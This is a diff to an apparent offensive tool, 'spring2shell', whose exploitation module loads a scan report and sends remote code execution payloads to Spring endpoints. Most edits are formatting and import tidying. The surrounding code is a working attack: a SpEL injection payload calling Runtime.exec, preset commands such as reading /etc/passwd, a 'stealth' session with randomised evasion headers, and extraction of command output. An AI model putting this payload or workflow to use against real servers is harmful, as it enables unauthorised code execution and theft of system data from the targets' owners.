@@ -14,9 +14,6 @@ import sys
 from pathlib import Path
 from typing import Any
 
-from spring2shell.utils.logging import log_event
-import logging
-
 _PRESET_COMMANDS = ["id", "whoami", "ls -la", "pwd", "cat /etc/passwd", "ps aux", "uname -a"]
 
 
@@ -60,8 +57,9 @@ def interactive_exploitation_menu(vulnerabilities: list[dict[str, Any]]) -> dict
             if 0 <= idx < len(vulnerabilities):
                 return vulnerabilities[idx]
             else:
-                print("[!] Invalid selection — enter a number between 1 and "
-                      f"{len(vulnerabilities)}")
+                print(
+                    f"[!] Invalid selection — enter a number between 1 and {len(vulnerabilities)}"
+                )
         else:
             print("[!] Invalid input")
 
@@ -77,7 +75,7 @@ def exploitation_command_menu() -> str:
     print("=" * 50)
     for i, cmd in enumerate(_PRESET_COMMANDS, 1):
         print(f"{i}. {cmd}")
-    print(f"{len(_PRESET_COMMANDS)+1}. custom — enter your own command")
+    print(f"{len(_PRESET_COMMANDS) + 1}. custom — enter your own command")
     print("\nOr type a command directly.")
 
     while True:
@@ -129,7 +127,8 @@ def load_report_and_exploit(report_file: str) -> None:
     # Support both old (results list) and new (findings key) schemas
     findings = data.get("findings", data.get("results", []))
     vulnerabilities = [
-        f for f in findings
+        f
+        for f in findings
         if f.get("status") in ("confirmed", "unverified", "Confirmed", "Unverified", "Potential")
         or f.get("vulnerable")
     ]
@@ -153,12 +152,11 @@ def load_report_and_exploit(report_file: str) -> None:
             continue
 
         # Lazy import to keep startup fast
+        from spring2shell.core.session import create_stealth_session
         from spring2shell.core.verifier import (
             _build_payload_from_template,
             _send_payload_request,
-            _strict_verify_execution,
         )
-        from spring2shell.core.session import create_stealth_session
         from spring2shell.evasion.headers import get_random_headers
 
         target_url = vuln.get("url", "")
@@ -178,15 +176,14 @@ def load_report_and_exploit(report_file: str) -> None:
         ]
 
         response = None
-        used_command = None
         for attempt_command in command_attempts:
             payload = _build_payload_from_template(payload_template, attempt_command)
             if not payload:
                 from spring2shell.core.verifier import _escape_java_string
+
                 escaped = _escape_java_string(attempt_command)
                 payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"  }}'
             try:
-                used_command = attempt_command
                 response = _send_payload_request(session, endpoint, method, headers.copy(), payload)
                 if response.status_code in (200, 400, 500):
                     break
@@ -199,15 +196,16 @@ def load_report_and_exploit(report_file: str) -> None:
             print(f"\n[+] Status: {response.status_code}  Size: {len(response.text)} chars")
             if unique_marker in response.text:
                 import re
+
                 pattern = f"{re.escape(unique_marker)}(.*?){re.escape(unique_marker)}"
                 match = re.search(pattern, response.text, re.DOTALL)
                 if match:
                     output = match.group(1).strip()
-                    print(f"\n[!] RCE CONFIRMED — output:\n{'-'*50}\n{output[:2000]}")
+                    print(f"\n[!] RCE CONFIRMED — output:\n{'-' * 50}\n{output[:2000]}")
                 else:
-                    print(f"[!] Marker found but output extraction failed")
+                    print("[!] Marker found but output extraction failed")
             else:
-                print(f"[+] Response preview:\n{'-'*50}\n{response.text[:500]}")
+                print(f"[+] Response preview:\n{'-' * 50}\n{response.text[:500]}")
 
         try:
             cont = input("\nContinue exploitation? (yes/no): ").strip().lower()
